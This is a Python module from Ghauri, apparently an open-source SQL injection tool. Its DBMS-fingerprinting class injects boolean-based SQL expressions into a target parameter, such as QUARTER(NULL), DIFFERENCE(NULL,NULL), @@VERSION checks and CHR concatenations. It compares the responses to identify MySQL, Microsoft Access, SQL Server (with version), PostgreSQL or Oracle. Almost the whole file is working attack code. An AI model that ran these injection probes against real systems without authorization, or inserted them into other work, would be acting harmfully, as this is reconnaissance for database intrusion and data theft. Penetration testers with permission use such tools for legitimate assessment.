#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.common.config import conf
from ghauri.core.inject import inject_expression
from ghauri.logger.colored_logger import logger
from ghauri.common.colors import nc, mc
from ghauri.common.lib import re, time, collections, quote, unquote
from ghauri.common.utils import (
    urlencode,
    urldecode,
    fetch_db_specific_payload,
    check_boolean_responses,
    check_booleanbased_tests,
    prepare_attack_request,
)


class FingerPrintDBMS:
    """
    this class will finger print database in case of boolean based injection
    """

    def __init__(
        self,
        base,
        parameter,
        url="",
        data="",
        headers="",
        injection_type="",
        proxy="",
        batch=False,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        vector="",
        attack="",
        attacks=None,
        case=None,
        code=None,
        match_string=None,
        not_match_string=None,
        text_only=False,
    ):
        self.base = conf.base
        self.parameter = parameter
        self.url = url
        self.data = data
        self.headers = headers
        self.injection_type = injection_type
        self.proxy = conf.proxy
        self.batch = conf.batch
        self.is_multipart = conf.is_multipart
        self.timeout = conf.timeout
        self.delay = conf.delay
        self.timesec = conf.timesec
        self.vector = vector
        self.attack01 = conf.attack01
        self._attacks = attacks
        self._case = case
        self.code = code
        self.match_string = conf.string
        self.not_match_string = conf.not_string
        self.text_only = conf.text_only

    def check_boolean_expression(self, expression, expected=True):
        expression = self.vector.replace("[INFERENCE]", expression)
        # logger.payload(f"{urldecode(expression)}")
        try:
            attack = inject_expression(
                url=self.url,
                data=self.data,
                proxy=self.proxy,
                delay=self.delay,
                timesec=self.timesec,
                timeout=self.timeout,
                headers=self.headers,
                parameter=self.parameter,
                expression=expression,
                is_multipart=self.is_multipart,
                injection_type=self.injection_type,
            )
        except KeyboardInterrupt as e:
            logger.warning("user aborted during DBMS fingerprint.")
        return attack

    def check_mysql(self, heuristic_backend_check=False):
        _temp = ""
        if heuristic_backend_check:
            attack = self.check_boolean_expression(
                expression="(SELECT QUARTER(NULL)) IS NULL"
            )
            attack01 = self.check_boolean_expression(
                expression="(SELECT 0x47776a68)='qSBB'"  # "(SELECT 0x47776a68)=0x47776a65"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if not result:
                attackt = self.check_boolean_expression(
                    expression="QUARTER(NULL) IS NULL"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attackt,
                    attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
            if result:
                is_ok = False
                if self._attacks:
                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
                    t1, f1 = attack.status_code, attack01.status_code
                    r0, r1 = self._attacks[0].redirected, attack.redirected
                    # logger.debug(
                    #     (
                    #         "matching responses of detedted payloads",
                    #         t0,
                    #         f0,
                    #         t1,
                    #         f1,
                    #         r0,
                    #         r1,
                    #     )
                    # )
                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
                if is_ok:
                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}MySQL{nc}'"
                    logger.notice(message)
                    _temp = "MySQL"
        else:
            logger.info(f"testing MySQL")
            attack = self.check_boolean_expression(
                expression="(SELECT QUARTER(NULL)) IS NULL"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                self.attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if not result:
                attackt = self.check_boolean_expression(
                    expression="QUARTER(NULL) IS NULL"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attackt,
                    self.attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
            ok = False
            if result:
                logger.info(f"confirming MySQL")
                attack = self.check_boolean_expression(
                    expression="SESSION_USER() LIKE USER()"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attack,
                    self.attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
                if not result:
                    # Note: MemSQL doesn't support SESSION_USER()
                    attack = self.check_boolean_expression(
                        expression="GEOGRAPHY_AREA(NULL) IS NULL"
                    )
                    bool_retval = check_boolean_responses(
                        self.base,
                        attack,
                        self.attack01,
                        match_string=self.match_string,
                        not_match_string=self.not_match_string,
                        code=self.code,
                        text_only=self.text_only,
                    )
                    result = bool_retval.vulnerable
                    case = bool_retval.case
                if not result:
                    warnMsg = "the back-end DBMS is not MySQL"
                    logger.warning(warnMsg)
                    ok = False
                    return ""
                ok = True
            else:
                warnMsg = "the back-end DBMS is not MySQL"
                logger.warning(warnMsg)
                ok = False
            if ok:
                logger.notice("the back-end DBMS is MySQL")
            if ok:
                _temp = "MySQL"
        return _temp

    def check_access(self, heuristic_backend_check=False):
        _temp = ""
        if heuristic_backend_check:
            attack = self.check_boolean_expression(expression="VAL(CVAR(1))=1")
            attack01 = self.check_boolean_expression(
                expression=quote(
                    "IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0",
                )
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if result:
                is_ok = False
                if self._attacks:
                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
                    t1, f1 = attack.status_code, attack01.status_code
                    r0, r1 = self._attacks[0].redirected, attack.redirected
                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
                if is_ok:
                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}Microsoft Access{nc}'"
                    logger.notice(message)
                    _temp = "Microsoft Access"
        else:
            logger.info(f"testing Microsoft Access")
            attack = self.check_boolean_expression(expression="VAL(CVAR(1))=1")
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                self.attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            ok = False
            if result:
                logger.info(f"confirming Microsoft Access")
                attack = self.check_boolean_expression(
                    expression="IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attack,
                    self.attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
                if not result:
                    warnMsg = "the back-end DBMS is not Microsoft Access"
                    logger.warning(warnMsg)
                    ok = False
                    return ""
                if result:
                    ok = True
            else:
                warnMsg = "the back-end DBMS is not Microsoft Access"
                logger.warning(warnMsg)
                ok = False
                return ""
            if ok:
                logger.notice("the back-end DBMS is Microsoft Access")
            if ok:
                _temp = "Microsoft Access"
        return _temp

    def check_mssql(self, heuristic_backend_check=False):
        _temp = ""
        db_version = ""
        if heuristic_backend_check:
            attack = self.check_boolean_expression(
                expression="(SELECT DIFFERENCE(NULL,NULL)) IS NULL"
            )
            attack01 = self.check_boolean_expression(
                expression=quote(
                    "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))='pNmJ'",
                    # "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))=CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(106)",
                    safe="=%",
                )
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if result:
                is_ok = False
                if self._attacks:
                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
                    t1, f1 = attack.status_code, attack01.status_code
                    r0, r1 = self._attacks[0].redirected, attack.redirected
                    # logger.debug(
                    #     (
                    #         "matching responses of detedted payloads",
                    #         t0,
                    #         f0,
                    #         t1,
                    #         f1,
                    #         r0,
                    #         r1,
                    #     )
                    # )
                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
                if is_ok:
                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}Microsoft SQL Server{nc}'"
                    logger.notice(message)
                    _temp = "Microsoft SQL Server"
        else:
            logger.info(f"testing Microsoft SQL Server")
            attack = self.check_boolean_expression(
                expression="UNICODE(SQUARE(NULL)) IS NULL"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                self.attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            ok = False
            if result:
                logger.info(f"confirming Microsoft SQL Server")
                lattack = attack
                for version, check in (
                    ("2019", "CHARINDEX('15.0.',@@VERSION)>0"),
                    ("Azure", "@@VERSION LIKE '%Azure%'"),
                    ("2017", "TRIM(NULL) IS NULL"),
                    ("2016", "ISJSON(NULL) IS NULL"),
                    ("2014", "CHARINDEX('12.0.',@@VERSION)>0"),
                    ("2012", "CONCAT(NULL,NULL)=CONCAT(NULL,NULL)"),
                    ("2008", "SYSDATETIME()=SYSDATETIME()"),
                    ("2005", "XACT_STATE()=XACT_STATE()"),
                    ("2000", "HOST_NAME()=HOST_NAME()"),
                ):
                    attack = self.check_boolean_expression(
                        expression=quote(check, safe="@>%")
                    )
                    _ = bool(attack.redirected == lattack.redirected)
                    if _:
                        bool_retval = check_boolean_responses(
                            self.base,
                            attack,
                            self.attack01,
                            match_string=self.match_string,
                            not_match_string=self.not_match_string,
                            code=self.code,
                            text_only=self.text_only,
                        )
                        result = bool_retval.vulnerable
                        if result:
                            db_version = f" {version}"
                            break
                ok = True
            else:
                warnMsg = "the back-end DBMS is not Microsoft SQL Server"
                logger.warning(warnMsg)
                ok = False
                return ""
            if ok:
                logger.notice("the back-end DBMS is Microsoft SQL Server")
                logger.success(f"back-end DBMS: Microsoft SQL Server{db_version}")
            if ok:
                _temp = "Microsoft SQL Server"
        return _temp

    def check_postgre(self, heuristic_backend_check=False):
        _temp = ""
        if heuristic_backend_check:
            attack = self.check_boolean_expression(
                expression="(SELECT QUOTE_IDENT(NULL)) IS NULL"
            )
            attack01 = self.check_boolean_expression(
                expression="(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))='QxXT'"  # "(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))=(CHR(76)||CHR(110)||CHR(85)||CHR(94))"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if result:
                is_ok = False
                if self._attacks:
                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
                    t1, f1 = attack.status_code, attack01.status_code
                    r0, r1 = self._attacks[0].redirected, attack.redirected
                    # logger.debug(
                    #     (
                    #         "matching responses of detedted payloads",
                    #         t0,
                    #         f0,
                    #         t1,
                    #         f1,
                    #         r0,
                    #         r1,
                    #     )
                    # )
                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
                if is_ok:
                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}PostgreSQL{nc}'"
                    logger.notice(message)
                    _temp = "PostgreSQL"
        else:
            logger.info(f"testing PostgreSQL")
            attack = self.check_boolean_expression(
                expression="CONVERT_TO((CHR(115)||CHR(120)||CHR(115)||CHR(101)), QUOTE_IDENT(NULL)) IS NULL"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                self.attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            ok = False
            if result:
                logger.info(f"confirming PostgreSQL")
                attack = self.check_boolean_expression(
                    expression="COALESCE(8009, NULL)=8009"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attack,
                    self.attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
                if not result:
                    warnMsg = "the back-end DBMS is not PostgreSQL"
                    logger.warning(warnMsg)
                    ok = False
                    return ""
                ok = True
            else:
                warnMsg = "the back-end DBMS is not PostgreSQL"
                logger.warning(warnMsg)
                ok = False
            if ok:
                logger.notice("the back-end DBMS is PostgreSQL")
            if ok:
                _temp = "PostgreSQL"
        return _temp

    def check_oracle(self, heuristic_backend_check=False):
        _temp = ""
        if heuristic_backend_check:
            attack = self.check_boolean_expression(
                expression="(SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL"
            )
            attack01 = self.check_boolean_expression(
                expression="(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)='SOTQ'"  # "(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)=CHR(112)||CHR(116)||CHR(90)||CHR(76)"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            if result:
                is_ok = False
                if self._attacks:
                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
                    t1, f1 = attack.status_code, attack01.status_code
                    r0, r1 = self._attacks[0].redirected, attack.redirected
                    # logger.debug(
                    #     (
                    #         "matching responses of detedted payloads",
                    #         t0,
                    #         f0,
                    #         t1,
                    #         f1,
                    #         r0,
                    #         r1,
                    #     )
                    # )
                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
                if is_ok:
                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}Oracle{nc}'"
                    logger.notice(message)
                    _temp = "Oracle"
        else:
            logger.info(f"testing Oracle")
            attack = self.check_boolean_expression(
                expression="LENGTH(SYSDATE)=LENGTH(SYSDATE)"
            )
            bool_retval = check_boolean_responses(
                self.base,
                attack,
                self.attack01,
                match_string=self.match_string,
                not_match_string=self.not_match_string,
                code=self.code,
                text_only=self.text_only,
            )
            result = bool_retval.vulnerable
            ok = False
            if result:
                logger.info(f"confirming Oracle")
                attack = self.check_boolean_expression(
                    expression="NVL(RAWTOHEX(5984),5984)=RAWTOHEX(5984)"
                )
                bool_retval = check_boolean_responses(
                    self.base,
                    attack,
                    self.attack01,
                    match_string=self.match_string,
                    not_match_string=self.not_match_string,
                    code=self.code,
                    text_only=self.text_only,
                )
                result = bool_retval.vulnerable
                if not result:
                    warnMsg = "the back-end DBMS is not Oracle"
                    logger.warning(warnMsg)
                    ok = False
                    return _temp
                ok = True
            else:
                warnMsg = "the back-end DBMS is not Oracle"
                logger.warning(warnMsg)
                ok = False
                return ""
            if ok:
                logger.notice("the back-end DBMS is Oracle")
            if ok:
                _temp = "Oracle"
        return _temp
